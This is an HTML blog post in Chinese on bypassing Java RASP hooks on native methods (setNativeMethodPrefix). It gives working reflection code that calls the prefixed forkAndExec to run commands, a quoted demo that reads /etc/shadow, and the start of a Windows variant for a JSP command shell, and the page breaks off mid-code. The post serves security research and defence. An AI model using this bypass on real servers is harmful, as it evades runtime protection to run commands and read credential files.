@@ -1,0 +1,563 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>Bypass RASP NativeMethodPrefix学习 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="Bypass RASP NativeMethodPrefix学习" />
+<meta property="og:description" content="1 背景众所周知，Java的RASP是没有办法直接Hook Native方法的，但确实有这个场景的需求。于是JDK官方出了一个java.lang" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-28T18:06:00+08:00" />
+<meta property="article:modified_time" content="2023-12-28T18:06:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="Bypass RASP NativeMethodPrefix学习"/>
+<meta name="twitter:description" content="1 背景众所周知，Java的RASP是没有办法直接Hook Native方法的，但确实有这个场景的需求。于是JDK官方出了一个java.lang"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/rasp-nativemethodprefix-bypass/" /><link rel="prev" href="https://yzddmr6.com/posts/jvm-hsdb-in-pentest/" /><link rel="next" href="https://yzddmr6.com/posts/gzh/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Bypass RASP NativeMethodPrefix学习",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/rasp-nativemethodprefix-bypass\/"
+        },"genre": "posts","wordcount":  1771 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/rasp-nativemethodprefix-bypass\/","datePublished": "2023-12-28T18:06:00+08:00","dateModified": "2023-12-28T18:06:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/showcase/"> 会议演讲 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/showcase/" title="">会议演讲</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#搞一个简单的rasp">搞一个简单的RASP</a></li>
+    <li><a href="#兼容无methodprefix场景添加回显">兼容无MethodPrefix场景&amp;添加回显</a></li>
+    <li><a href="#支持windows">支持Windows</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Bypass RASP NativeMethodPrefix学习</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-12-28">2023-12-28</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-12-28">2023-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1771 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#背景">背景</a></li>
+    <li><a href="#搞一个简单的rasp">搞一个简单的RASP</a></li>
+    <li><a href="#兼容无methodprefix场景添加回显">兼容无MethodPrefix场景&amp;添加回显</a></li>
+    <li><a href="#支持windows">支持Windows</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<h2 id="背景" class="headerLink">
+    <a href="#%e8%83%8c%e6%99%af" class="header-mark"></a>1 背景</h2><p>众所周知，Java的RASP是没有办法直接Hook Native方法的，但确实有这个场景的需求。于是JDK官方出了一个java.lang.instrument.Instrumentation#setNativeMethodPrefix，在Java方法映射C++方法的时候加一个前缀，这样相当于创建一个了原有Native方法的代理，从而实现了Hook Native方法。</p>
+<p>jrasp应该是最早公开介绍该技术用于RASP防御的（经su18师傅提醒，严谨一些）：https://www.jrasp.com/guide/technology/native_method.html。</p>
+<p>但是当攻击者有一定代码执行权限的时候，还是可以绕过。以命令执行来说，原来的Native方法为forkAndExec，加个前缀变成prefix_forkAndExec，那么我们只需要反射调用prefix_forkAndExec这个新的方法名即可。</p>
+<p>turn1tup师傅给出了一个绕过的demo，核心逻辑为通过反射拿到真正的native方法，即可绕过RASP对于命令执行的hook:</p>
+<p><a href="https://github.com/turn1tup/JvmRaspBypass/blob/main/src/main/java/com/test/RaspExample.java" target="_blank" rel="noopener noreferrer">https://github.com/turn1tup/JvmRaspBypass/blob/main/src/main/java/com/test/RaspExample.java</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">    Class&lt;?&gt; clazz = Class.forName(&#34;java.lang.UNIXProcess&#34;);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    //cmd2,bypass jrasp native hook
+</span></span><span class="line"><span class="cl">    for (Method m : clazz.getDeclaredMethods()) {
+</span></span><span class="line"><span class="cl">        if (m.getName().endsWith(&#34;forkAndExec&#34;)&amp;&amp;!m.getName().equals(&#34;forkAndExec&#34;)) {
+</span></span><span class="line"><span class="cl">            m.setAccessible(true);
+</span></span><span class="line"><span class="cl">            System.out.println(&#34;prefix native method : &#34;+m.getName());
+</span></span><span class="line"><span class="cl">            Cmd.linuxCmd(new String[]{&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;cat /etc/shadow &amp;&amp; touch /tmp/shadow2&#34;},m);
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">} catch (Exception ignore) {
+</span></span><span class="line"><span class="cl">    ignore.printStackTrace();
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>最近在实际攻防中发现该方式挺有用的，因此本人进行扩展，实现了一个Win/Linux下通用的，自动绕过MethodPrefix的，可回显的，反射Native方法执行命令的JSP Demo。</p>
+<h2 id="搞一个简单的rasp" class="headerLink">
+    <a href="#%e6%90%9e%e4%b8%80%e4%b8%aa%e7%ae%80%e5%8d%95%e7%9a%84rasp" class="header-mark"></a>2 搞一个简单的RASP</h2><p>为了测试，先模拟一个setNativeMethodPrefix的RASP，参考 <a href="https://www.secrss.com/articles/49044" target="_blank" rel="noopener noreferrer">https://www.secrss.com/articles/49044</a>，主要逻辑为：</p>
+<p>1.移除想要hook的native方法。</p>
+<p>2.增加一个native方法，这个方法和hook的native方法除了方法名增加prefix，其他相同。</p>
+<p>3.增加一个和hook native方法同名的java方法（除了native modifier之外其他和hook native 方法相同），其中返回时调用prefix native方法。</p>
+<p>这里为了简单起见直接throw Exception，把命令执行给干掉。</p>
+<p>核心代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public static byte[] transformed() {
+</span></span><span class="line"><span class="cl">      ClassPool pool = ClassPool.getDefault();
+</span></span><span class="line"><span class="cl">      CtClass clazz = null;
+</span></span><span class="line"><span class="cl">      try {
+</span></span><span class="line"><span class="cl">          System.out.println(&#34;start convert java.lang.UNIXProcess&#34;);
+</span></span><span class="line"><span class="cl">          clazz = pool.getCtClass(&#34;java.lang.UNIXProcess&#34;);
+</span></span><span class="line"><span class="cl">          if (clazz.isFrozen()) {
+</span></span><span class="line"><span class="cl">              clazz.defrost();
+</span></span><span class="line"><span class="cl">          }
+</span></span><span class="line"><span class="cl">          CtMethod method = CtNewMethod.make(&#34;int myPrefix_forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10);&#34;, clazz);
+</span></span><span class="line"><span class="cl">          method.setModifiers(Modifier.PRIVATE | Modifier.NATIVE);
+</span></span><span class="line"><span class="cl">          System.out.println(&#34;add new native method myPrefix_forkAndExec&#34;);
+</span></span><span class="line"><span class="cl">          clazz.addMethod(method);
+</span></span><span class="line"><span class="cl">          CtMethod method1 = clazz.getDeclaredMethod(&#34;forkAndExec&#34;);
+</span></span><span class="line"><span class="cl">          System.out.println(&#34;remove old native method forkAndExec&#34;);
+</span></span><span class="line"><span class="cl">          clazz.removeMethod(method1);
+</span></span><span class="line"><span class="cl">          CtMethod method2 = CtNewMethod.make(&#34;int forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10) { throw new RuntimeException(\&#34;RASP hooked forkAndExec\&#34;); }&#34;, clazz);
+</span></span><span class="line"><span class="cl">          System.out.println(&#34;add new method forkAndExec&#34;);
+</span></span><span class="line"><span class="cl">          clazz.addMethod(method2);
+</span></span><span class="line"><span class="cl">          return clazz.toBytecode();
+</span></span><span class="line"><span class="cl">      } catch (Exception e) {
+</span></span><span class="line"><span class="cl">          e.printStackTrace();
+</span></span><span class="line"><span class="cl">      }
+</span></span><span class="line"><span class="cl">      return new byte[0];
+</span></span><span class="line"><span class="cl">  }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接命令执行会被干掉</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703745639658-e0cb2b7e-5b4d-492d-af51-0aafd632c8a0.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703745639658-e0cb2b7e-5b4d-492d-af51-0aafd632c8a0.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703745639658-e0cb2b7e-5b4d-492d-af51-0aafd632c8a0.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703745639658-e0cb2b7e-5b4d-492d-af51-0aafd632c8a0.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703745639658-e0cb2b7e-5b4d-492d-af51-0aafd632c8a0.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703745639658-e0cb2b7e-5b4d-492d-af51-0aafd632c8a0.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="兼容无methodprefix场景添加回显" class="headerLink">
+    <a href="#%e5%85%bc%e5%ae%b9%e6%97%a0methodprefix%e5%9c%ba%e6%99%af%e6%b7%bb%e5%8a%a0%e5%9b%9e%e6%98%be" class="header-mark"></a>3 兼容无MethodPrefix场景&amp;添加回显</h2><p>把turn1tup师傅的代码改成JSP版本</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620703364-0b47a09d-b95e-4c9d-bd3d-65c403d1b226.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620703364-0b47a09d-b95e-4c9d-bd3d-65c403d1b226.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620703364-0b47a09d-b95e-4c9d-bd3d-65c403d1b226.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620703364-0b47a09d-b95e-4c9d-bd3d-65c403d1b226.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620703364-0b47a09d-b95e-4c9d-bd3d-65c403d1b226.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620703364-0b47a09d-b95e-4c9d-bd3d-65c403d1b226.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620650321-1557bd8b-79a5-43b4-a459-b998e84eefd8.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620650321-1557bd8b-79a5-43b4-a459-b998e84eefd8.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620650321-1557bd8b-79a5-43b4-a459-b998e84eefd8.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620650321-1557bd8b-79a5-43b4-a459-b998e84eefd8.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620650321-1557bd8b-79a5-43b4-a459-b998e84eefd8.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1702620650321-1557bd8b-79a5-43b4-a459-b998e84eefd8.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>可以绕过并执行命令，但是没回显，并且turn1tup师傅的代码仅适用于设置了MethodPrefix的场景，没设置反而不行。</p>
+<p>javasec有一个Linux下反射Native执行命令并回显的demo，直接拿来改改</p>
+<p>核心代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">try {
+</span></span><span class="line"><span class="cl">        Method forkMethod = processClass.getDeclaredMethod(&#34;forkAndExec&#34;, new Class[]{
+</span></span><span class="line"><span class="cl">                int.class, byte[].class, byte[].class, byte[].class, int.class,
+</span></span><span class="line"><span class="cl">                byte[].class, int.class, byte[].class, int[].class, boolean.class
+</span></span><span class="line"><span class="cl">        });
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        forkMethod.setAccessible(true);// 设置访问权限
+</span></span><span class="line"><span class="cl">        int pid = (int) forkMethod.invoke(processObject, new Object[]{
+</span></span><span class="line"><span class="cl">                ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
+</span></span><span class="line"><span class="cl">                null, envc[0], null, std_fds, false
+</span></span><span class="line"><span class="cl">        });
+</span></span><span class="line"><span class="cl">    } catch (Exception e) {
+</span></span><span class="line"><span class="cl">        System.out.println(&#34;[-] reflect forkAndExec failed,try to bypass&#34;);
+</span></span><span class="line"><span class="cl">        for (Method m : processClass.getDeclaredMethods()) {
+</span></span><span class="line"><span class="cl">            if (m.getName().endsWith(&#34;forkAndExec&#34;) &amp;&amp; !m.getName().equals(&#34;forkAndExec&#34;)) {
+</span></span><span class="line"><span class="cl">                System.out.println(&#34;[+] get prefix native method : &#34; + m.getName());
+</span></span><span class="line"><span class="cl">                m.setAccessible(true);
+</span></span><span class="line"><span class="cl">                int pid = (int) m.invoke(processObject, new Object[]{
+</span></span><span class="line"><span class="cl">                        ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length,
+</span></span><span class="line"><span class="cl">                        null, envc[0], null, std_fds, false
+</span></span><span class="line"><span class="cl">                });
+</span></span><span class="line"><span class="cl">            }
+</span></span><span class="line"><span class="cl">        }
+</span></span><span class="line"><span class="cl">    }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>效果</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671179600-8b0a1561-479d-4fc3-98d6-100f53cfdbeb.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671179600-8b0a1561-479d-4fc3-98d6-100f53cfdbeb.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671179600-8b0a1561-479d-4fc3-98d6-100f53cfdbeb.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671179600-8b0a1561-479d-4fc3-98d6-100f53cfdbeb.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671179600-8b0a1561-479d-4fc3-98d6-100f53cfdbeb.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671179600-8b0a1561-479d-4fc3-98d6-100f53cfdbeb.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671168183-676f0fc7-352e-455b-bce5-3dafc811a1b2.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671168183-676f0fc7-352e-455b-bce5-3dafc811a1b2.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671168183-676f0fc7-352e-455b-bce5-3dafc811a1b2.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671168183-676f0fc7-352e-455b-bce5-3dafc811a1b2.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671168183-676f0fc7-352e-455b-bce5-3dafc811a1b2.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703671168183-676f0fc7-352e-455b-bce5-3dafc811a1b2.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="支持windows" class="headerLink">
+    <a href="#%e6%94%af%e6%8c%81windows" class="header-mark"></a>4 支持Windows</h2><p>搜了一下发现公开的调用Native绕过的都是Linux平台的，debug看了一下Windows的</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703661903360-c000b105-8079-48ce-8f59-d86d9e17c604.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703661903360-c000b105-8079-48ce-8f59-d86d9e17c604.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703661903360-c000b105-8079-48ce-8f59-d86d9e17c604.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703661903360-c000b105-8079-48ce-8f59-d86d9e17c604.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703661903360-c000b105-8079-48ce-8f59-d86d9e17c604.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703661903360-c000b105-8079-48ce-8f59-d86d9e17c604.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>Windows反射Native更简单：Windows执行命令对应的Native方法是java.lang.ProcessImpl#create，create方法是个static，不需要实例化对象就可以调用；另外获取回显的文件描述符stdHandles也不像Linux那么多处理分支，可以直接用代码实现，不需要再反射调用。</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703662040978-1c1532a5-f916-48c6-9963-80dd71a9a9b0.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703662040978-1c1532a5-f916-48c6-9963-80dd71a9a9b0.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703662040978-1c1532a5-f916-48c6-9963-80dd71a9a9b0.png"
+            srcset="https://cdn.nlark.com/yuque/0/2023/png/1599908/1703662040978-1c1532a5-f916-48c6-9963-80dd71a9a9b0.png, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703662040978-1c1532a5-f916-48c6-9963-80dd71a9a9b0.png 1.5x, https://cdn.nlark.com/yuque/0/2023/png/1599908/1703662040978-1c1532a5-f916-48c6-9963-80dd71a9a9b0.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>核心代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">public static String WinCreateProcess(String cmd) throws Exception {
+</span></span><span class="line"><span class="cl">    Class&lt;?&gt; processImplClass = Class.forName(&#34;java.lang.ProcessImpl&#34;);
+</span></span><span class="line"><span class="cl">    long[] stdHandles = new long[]{-1, -1, -1}; // Initialize as invalid handles.
+</span></span><span class="line"><span class="cl">    sun.misc.JavaIOFileDescriptorAccess fdAccess
+</span></span><span class="line"><span class="cl">            = sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    // 这里将 redirectErrorStream 设置为 true 以便于将错误输出重定向到标准输出
+</span></span><span class="line"><span class="cl">    boolean redirectErrorStream = true;
+</span></span><span class="line"><span class="cl">    try {
+</span></span><span class="line"><span class="cl">        Method createMethod = processImplClass.getDeclaredMethod(&#34;create&#34;,
